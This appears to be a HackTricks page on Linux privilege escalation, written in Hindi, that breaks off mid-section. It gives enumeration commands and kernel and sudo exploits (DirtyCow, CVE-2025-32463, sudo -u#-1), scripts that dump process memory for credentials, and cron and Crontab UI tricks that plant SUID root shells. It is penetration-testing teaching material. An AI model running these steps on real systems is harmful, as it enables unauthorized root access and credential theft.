# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

विस्तृत पृष्ठभूमि और ऐतिहासिक enumeration workflows के लिए, references में दी गई g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation और linux-private-i संसाधनों से तुलना करें।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## सिस्टम की जानकारी

### OS की जानकारी

आइए, सबसे पहले चल रहे OS के बारे में कुछ जानकारी हासिल करें।

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

यदि आपको `PATH` variable के अंदर मौजूद किसी भी folder पर **write permissions** हैं, तो आप कुछ libraries या binaries को hijack कर सकते हैं:

```bash
echo $PATH
```

### Env जानकारी

क्या environment variables में कोई दिलचस्प जानकारी, पासवर्ड या API keys हैं?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Kernel version जांचें और देखें कि क्या privileges escalate करने के लिए कोई exploit इस्तेमाल किया जा सकता है।

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) में local escalation के मामले और Binary Exploitation में Linux kernel पर विस्तृत लेखों के links दिए गए हैं। किसी case study को test करने से पहले प्रभावित build और configuration की पुष्टि करें।

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

आपको vulnerable kernels की एक अच्छी सूची और कुछ पहले से **compiled exploits** यहाँ मिल सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)।<sup>[[12]](#references)</sup>\
कुछ अन्य साइटें जहाँ आपको **compiled exploits** मिल सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Kernel exploits खोजने में मदद करने वाले टूल हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर execute करें, यह केवल kernel 2.x के exploits जाँचता है)

हमेशा **Google पर kernel version खोजें**, हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो जाएँगे कि यह exploit मान्य है।

Kernel exploitation की अतिरिक्त तकनीकें:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux privilege escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo संस्करण

इनमें दिखने वाले vulnerable sudo versions के आधार पर:

```bash
searchsploit sudo
```

आप इस grep से जांच सकते हैं कि sudo का संस्करण असुरक्षित है या नहीं।

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 से 1.9.17** तक, unprivileged local users को `--chroot` option के ज़रिए root तक escalate करने देता है, जब sudo `/etc/nsswitch.conf` को user-controlled directory से load करता है; upstream ने इसे **1.9.17p1** में ठीक किया। संबंधित paths में हर executable root-setuid sudo binary जाँचें, क्योंकि `sudo -V` केवल `PATH` से चुनी गई binary की जानकारी देता है। Distribution packages upstream version string बदले बिना fix को backport कर सकते हैं, इसलिए vendor package status भी सत्यापित करें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/3) देखें।<sup>[[28]](#references)[[29]](#references)</sup>

इस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) का exploit करने के लिए यहाँ एक [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) है। Exploit चलाने से पहले सुनिश्चित करें कि आपका `sudo` version vulnerable है और `chroot` feature को support करता है।

अधिक जानकारी के लिए, मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Upstream sudo **1.8.8 से 1.9.17** तक, host-based sudoers rules को **real hostname** के बजाय `sudo -h <host>` से मिले **user-supplied hostname** का उपयोग करके evaluate कर सकता है; upstream ने इसे **1.9.17p1** में ठीक किया। चुने गए host पर user के पास matching sudoers entry फिर भी होनी चाहिए। Local policy के साथ vendor backports और alternate sudo binaries की भी जाँच करें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/2) देखें।<sup>[[29]](#references)</sup>

आवश्यकताएँ:
- Vulnerable sudo version
- Host-specific sudoers rules (host मौजूदा hostname या `ALL` नहीं होना चाहिए)

sudoers pattern का उदाहरण:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

अनुमत host को spoof करके exploit करें:

```bash
sudo -h devbox id
sudo -h devbox -i
```

यदि चुने गए नाम का resolution रुक जाता है, तो सत्यापित करें कि वह नाम host पर कैसे resolve होता है। किसी log या configuration file में नाम दिखने भर से वह resolvable नहीं हो जाता, और `/etc/hosts` में बदलाव करने के लिए सामान्यतः privileged write access की आवश्यकता होती है।

#### sudo < v1.8.28

इस [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) के लिए एक प्रभावी sudo rule आवश्यक है, जो root को छोड़कर `ALL` users के रूप में command चलाने की अनुमति देता हो, जैसे `(ALL, !root) /bin/bash`। Caller को उस rule का उपयोग करने की अनुमति भी होनी चाहिए, जिसमें authentication की कोई भी आवश्यकता शामिल है। Installed package advisory जाँचें: vendors ने fix को उन releases में backport किया था जिनका प्रदर्शित upstream version अब भी 1.8.28 से कम है। केवल `!root` rule या पुराना version होने से exposure की पुष्टि नहीं होती। Passive enumeration के दौरान privileged command का परीक्षण न करें।

```
sudo -u#-1 /bin/bash
```

### Dmesg हस्ताक्षर सत्यापन विफल हुआ

इस vuln का शोषण कैसे किया जा सकता है, इसका **उदाहरण** देखने के लिए **HTB के smasher2 box** को देखें।

```bash
dmesg 2>/dev/null | grep "signature"
```

### अधिक सिस्टम enumeration

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## संभावित सुरक्षा उपायों की सूची बनाएं

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

अगर आप किसी container के अंदर हैं, तो पहले container-security section देखें और फिर runtime-specific abuse pages पर जाएँ:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ड्राइव

जाँचें कि **क्या mount या unmount है**, कहाँ और क्यों। अगर कुछ unmount है, तो आप उसे mount करके निजी जानकारी ढूँढ़ने की कोशिश कर सकते हैं.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## उपयोगी सॉफ़्टवेयर

उपयोगी binaries की सूची बनाएँ

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

यह भी जांचें कि **कोई compiler इंस्टॉल है या नहीं**। यह उपयोगी है यदि आपको किसी kernel exploit का उपयोग करना हो, क्योंकि इसे उसी मशीन पर compile करने की सलाह दी जाती है जहां आप इसका उपयोग करने वाले हैं (या किसी समान मशीन पर)।

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### इंस्टॉल किया गया Vulnerable Software

**इंस्टॉल किए गए packages और services के version** की जाँच करें। हो सकता है कि Nagios का कोई पुराना version हो (उदाहरण के लिए), जिसका इस्तेमाल privilege escalation के लिए किया जा सके…\
अधिक संदिग्ध इंस्टॉल किए गए software के version को manually जाँचने की सलाह दी जाती है।

```bash
dpkg -l #Debian
rpm -qa #Centos
```

यदि आपके पास मशीन का SSH access है, तो आप मशीन के अंदर इंस्टॉल किए गए पुराने और vulnerable software की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगी, जिसमें से अधिकांश बेकार होगी। इसलिए OpenVAS या इसी तरह के कुछ applications का उपयोग करने की सलाह दी जाती है, जो जाँचेंगे कि इंस्टॉल किए गए किसी software version में ज्ञात exploits के लिए vulnerability है या नहीं।_

## Processes

देखें कि **कौन-से processes** execute हो रहे हैं और जाँचें कि क्या किसी process के पास **उससे अधिक privileges हैं जितने होने चाहिए** (हो सकता है कि कोई tomcat root द्वारा execute किया जा रहा हो?)

```bash
ps aux
ps -ef
top -n 1
```

हमेशा [**electron/cef/chromium debuggers** चल रहे हैं या नहीं, यह जांचें; privileges बढ़ाने के लिए उनका दुरुपयोग किया जा सकता है](../../software-information/electron-cef-chromium-debugger-abuse.md)। **Linpeas** process की command line में `--inspect` parameter जांचकर उनका पता लगाता है।\
यह भी **जांचें कि processes की binaries पर आपके क्या privileges हैं**; हो सकता है कि आप किसी binary को overwrite कर सकें।

### अलग-अलग users के बीच parent-child chains

किसी child process का अपने parent से **अलग user** के तहत चलना अपने-आप में malicious नहीं है, लेकिन यह **triage का उपयोगी संकेत** है। कुछ transitions अपेक्षित होते हैं (`root` द्वारा service user शुरू करना, login managers द्वारा session processes बनाना), लेकिन असामान्य chains wrappers, debug helpers, persistence या runtime trust boundaries की कमज़ोरियों का खुलासा कर सकती हैं।

त्वरित समीक्षा:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

अगर आपको कोई अप्रत्याशित chain मिले, तो parent command line और उसके व्यवहार को प्रभावित करने वाली सभी files (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments) की जाँच करें। कई वास्तविक privesc paths में child स्वयं writable नहीं था, लेकिन **parent-controlled config** या helper chain writable थी।

### Deleted executables और deleted-open files

Runtime artifacts अक्सर **हटाए जाने के बाद भी** accessible रहते हैं। यह privilege escalation और उन processes से evidence recover करने, दोनों के लिए उपयोगी है जिनके पास पहले से sensitive files खुली हैं।

Deleted executables की जाँच करें:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

यदि `/proc/<PID>/exe` `(deleted)` की ओर इंगित करता है, तो प्रक्रिया अभी भी memory से पुरानी binary image चला रही है। यह जांच करने का एक मजबूत संकेत है, क्योंकि:

- हटाई गई executable में दिलचस्प strings या credentials हो सकते हैं
- चल रही प्रक्रिया अब भी उपयोगी file descriptors उपलब्ध करा सकती है
- हटाई गई privileged binary हालिया छेड़छाड़ या cleanup के प्रयास का संकेत हो सकती है

सभी जगहों पर हटाई गई और खुली files इकट्ठा करें:

```bash
lsof +L1
```

यदि आपको कोई दिलचस्प descriptor मिले, तो उसे सीधे recover करें:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

यह खास तौर पर तब उपयोगी होता है, जब किसी प्रोसेस में अब भी कोई deleted secret, script, database export या flag file खुली हो।

### प्रोसेस की निगरानी

प्रोसेस की निगरानी के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे टूल इस्तेमाल किए जा सकते हैं। बार-बार चलाए जा रहे vulnerable प्रोसेस या शर्तों का कोई समूह पूरा होने पर चलने वाले प्रोसेस पहचानने में यह बहुत उपयोगी हो सकता है।

#### sudo के तहत Linux ProcMon

[Linux के लिए ProcMon](https://github.com/microsoft/ProcMon-for-Linux) चुने हुए प्रोसेस और system calls को trace करके SQLite trace सेव कर सकता है। अगर `sudo -l` बिना किसी प्रतिबंध के root-capable `procmon` command चलाने की अनुमति देता है, तो विचार करें कि क्या इसका इस्तेमाल किसी दूसरे यूज़र के प्रोसेस के input या output को देखने के लिए किया जा सकता है। यह अनुमति केवल आगे जाँच करने का संकेत है: tracer का support, प्रभावी policy और उपयुक्त प्रोसेस की गतिविधि—ये सभी मायने रखते हैं। Trace files में secrets हो सकते हैं, इसलिए अधिकृत exports की सावधानी से जाँच करें और असंबंधित प्रोसेस का डेटा इकट्ठा करने से बचें।

### प्रोसेस की memory

किसी server की कुछ services **credentials को memory में clear text के रूप में सेव करती हैं**।\
आमतौर पर, दूसरे यूज़र्स के प्रोसेस की memory पढ़ने के लिए आपको **root privileges** की ज़रूरत होगी। इसलिए, यह तरीका आमतौर पर तब ज़्यादा उपयोगी होता है जब आपके पास पहले से root access हो और आप और credentials ढूँढना चाहते हों।\
हालाँकि, याद रखें कि **एक regular user के रूप में आप अपने प्रोसेस की memory पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल ज़्यादातर मशीनें **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देतीं**, यानी आप अपने unprivileged user के दूसरे प्रोसेस का dump नहीं ले सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी प्रोसेस को debug किया जा सकता है, बशर्ते उनका uid समान हो। ptrace के काम करने का यह पारंपरिक तरीका था।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का इस्तेमाल कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability ज़रूरी है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी प्रोसेस को ptrace से trace नहीं किया जा सकता। इसे सेट करने के बाद ptrace को फिर से सक्षम करने के लिए reboot करना होगा।

एक ही UID वाला प्रोसेस, जो कुछ समय के लिए password vault को unlock करता है, credentials की एक अलग सुरक्षा-सीमा बन सकता है। जब tracing की अनुमति हो, तो कोई सक्रिय और dumpable प्रोसेस अपने input syscalls या memory के ज़रिए vault password उजागर कर सकता है, भले ही encrypted vault file सुरक्षित रहे। `ptrace_scope=0` होना केवल एक पूर्वशर्त है: समान credentials, target की dumpability, अन्य Linux security modules और प्रोसेस कितनी देर तक चलता है—ये सभी मायने रखते हैं। Vault की किसी entry को Unix root login के रूप में इस्तेमाल किया जा सकता है या नहीं, इसकी अलग से credential-reuse जाँच ज़रूरी है। नियमित enumeration में policy और संभावित प्रोसेस या vault paths की जानकारी दें; input capture न करें और secrets न दिखाएँ। [kernel का Yama दस्तावेज़](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) और [ptrace access checks](https://man7.org/linux/man-pages/man2/ptrace.2.html) देखें।

#### GDB

अगर आपके पास किसी FTP service (उदाहरण के लिए) की memory तक पहुँच है, तो आप उसका Heap प्राप्त करके उसमें credentials खोज सकते हैं।

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाता है कि उस process के virtual address space में memory कैसे mapped है**; यह **हर mapped region की permissions** भी दिखाता है। **mem** pseudo file **process की memory को स्वयं expose करती है**। **maps** file से हमें पता चलता है कि कौन-से **memory regions readable हैं** और उनके offsets क्या हैं। इस जानकारी का उपयोग करके हम **mem file में seek करते हैं और सभी readable regions को dump करके** एक file में सहेजते हैं।

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` सिस्टम की **physical** memory तक पहुँच प्रदान करता है, virtual memory तक नहीं। Kernel के virtual address space को /dev/kmem का उपयोग करके एक्सेस किया जा सकता है।\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group के लिए readable होता है।

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump for linux

ProcDump, Windows के Sysinternals टूल्स सुइट के क्लासिक ProcDump टूल का Linux के लिए नया रूप है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### टूल

प्रोसेस मेमोरी dump करने के लिए आप यह इस्तेमाल कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप root की आवश्यकता को मैन्युअल रूप से हटा सकते हैं और अपने स्वामित्व वाले प्रोसेस का dump ले सकते हैं
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) से Script A.5 (root आवश्यक है)

### प्रोसेस मेमोरी से Credentials

#### मैन्युअल उदाहरण

अगर आपको पता चले कि authenticator प्रोसेस चल रहा है:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

आप process को dump कर सकते हैं (किसी process की memory dump करने के अलग-अलग तरीकों के लिए पिछले sections देखें) और memory में credentials खोज सकते हैं:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) memory और कुछ **जानी-मानी फ़ाइलों** से **plain text credentials चुरा** सकता है। इसे ठीक से काम करने के लिए root privileges की आवश्यकता होती है।

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

अगर web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback से जुड़ा है, तब भी आप SSH local port-forwarding के ज़रिए इसे एक्सेस कर सकते हैं और privesc के लिए एक privileged job बना सकते हैं।<sup>[[1]](#references)[[4]](#references)</sup>

आम chain
- loopback-only port (जैसे, 127.0.0.1:8000) और Basic-Auth realm का पता लगाएँ: `ss -ntlp` / `curl -v localhost:8000`
- operational artifacts में credentials खोजें:
  - `zip -P <password>` वाले backups/scripts
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` दिखाने वाली systemd unit
- Tunnel बनाकर login करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएं (SUID shell बनाता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Crontab UI को root के रूप में न चलाएँ; इसके लिए dedicated user और न्यूनतम permissions का उपयोग करें
- localhost पर bind करें और firewall/VPN के ज़रिए access को अतिरिक्त रूप से प्रतिबंधित करें; passwords का दोबारा उपयोग न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या केवल root द्वारा पढ़ी जा सकने वाली EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप root द्वारा execute की जाने वाली किसी script का फ़ायदा उठा सकें (wildcard vuln? क्या आप उन files को modify कर सकते हैं जिनका root उपयोग करता है? symlinks का उपयोग करें? उस directory में specific files बनाएँ जिसका root उपयोग करता है?)

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

यदि `run-parts` का उपयोग किया जाता है, तो जाँचें कि वास्तव में कौन-से नाम चलेंगे:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

इससे false positives से बचा जा सकता है। लिखने योग्य periodic directory तभी उपयोगी होती है, जब आपके payload का filename स्थानीय `run-parts` नियमों से मेल खाता हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ में आपको PATH मिल सकता है: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि "user" उपयोगकर्ता को /home/user पर लिखने की अनुमति है_)

अगर इस crontab में root उपयोगकर्ता path सेट किए बिना कोई command या script चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप इसका उपयोग करके root shell प्राप्त कर सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Wildcard (Wildcard Injection) का उपयोग करने वाली script के साथ Cron

अगर root द्वारा execute की जाने वाली किसी script में command के अंदर “**\***” हो, तो आप इसका फायदा उठाकर अप्रत्याशित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**यदि wildcard के पहले** _**/some/path/\***_ **जैसा path हो, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

wildcard exploitation की अन्य तरकीबों के लिए यह पेज पढ़ें:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parsers में Bash arithmetic expansion injection

Bash arithmetic untrusted text को expression के रूप में समझ सकता है। प्रभावित Bash contexts में, उस expression के अंदर array subscript एक command substitution evaluate कर सकता है। यदि कोई privileged cron/parser attacker-controlled log text को ऐसे arithmetic comparison में रखता है, तो substitution parser की identity के साथ चल सकता है।<sup>[[22]](#references)</sup> यह सटीक Bash expression और version पर निर्भर करता है; expanded variable में केवल bare `$(...)0` string होना, अपने आप में, दोबारा evaluation का भरोसेमंद प्रदर्शन नहीं है।

Input file metadata या user-writable location से पढ़े गए किसी अन्य field से भी आ सकता है। उदाहरण के लिए, कोई privileged cleanup script जो image का `Producer` tag पढ़ता है और उसकी तुलना `[[ "$producer" -eq "expected" ]]` से करता है, arithmetic comparison करता है, भले ही variable quoted हो। Scheduled identity, किन files से tag मिल सकता है, comparison से पहले हुए किसी भी transformation और Bash के सटीक behavior की जाँच करें। Text labels के लिए string comparison इस्तेमाल करें; numbers के लिए arithmetic से पहले input को decimal digits के रूप में validate करें। [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) देखें।

- आम vulnerable pattern:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism के व्यवहार की सुरक्षित स्थानीय जांच (कोई privileged process या file परिवर्तन नहीं):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

वास्तव में शेड्यूल की गई script और वह literal input path खोजें जिसे यह खोलती है। अगर log file खुद writable न भी हो, तो उसके non-sticky parent में लिखने और traverse करने की अनुमति रखने वाला user उसकी directory entry को बदल सकता है; `namei -l` इन permissions में अंतर समझने में मदद करता है। कोई दूसरा writable log path, unreadable scheduler, या ऐसा parser जो उस field को Bash arithmetic के रूप में evaluate ही न करे, इस path को स्थापित नहीं करता।

### Cron script overwriting and symlink

अगर आप **root द्वारा execute की जाने वाली cron script को modify कर सकते हैं**, तो आप बहुत आसानी से shell पा सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

यदि root द्वारा execute की गई script किसी **ऐसी directory का उपयोग करती है जिस पर आपका पूरा access है**, तो शायद उस folder को delete करके **किसी दूसरी directory की ओर इशारा करने वाला symlink folder बनाना** उपयोगी हो सकता है, जो आपके control वाली script serve करती हो।

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink validation और अधिक सुरक्षित file handling

Path के ज़रिए फ़ाइलें पढ़ने या लिखने वाली privileged scripts/binaries की समीक्षा करते समय जाँचें कि links को कैसे संभाला जाता है:

- `stat()` symlink को follow करता है और target का metadata लौटाता है।
- `lstat()` link का metadata लौटाता है।
- `readlink -f` और `namei -l` अंतिम target resolve करने और path के हर component की permissions दिखाने में मदद करते हैं।

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

डिफेंडर्स/डेवलपर्स के लिए, symlink tricks से बचाव के अधिक सुरक्षित तरीके:

- `O_EXCL` के साथ `O_CREAT`: अगर path पहले से मौजूद हो, तो विफल हो जाए (हमलावर द्वारा पहले से बनाए गए links/files को रोकता है)।
- `openat()`: किसी trusted directory file descriptor के सापेक्ष काम करता है।
- `mkstemp()`: सुरक्षित permissions के साथ अस्थायी files atomically बनाता है।

### writable payloads वाले custom-signed cron binaries
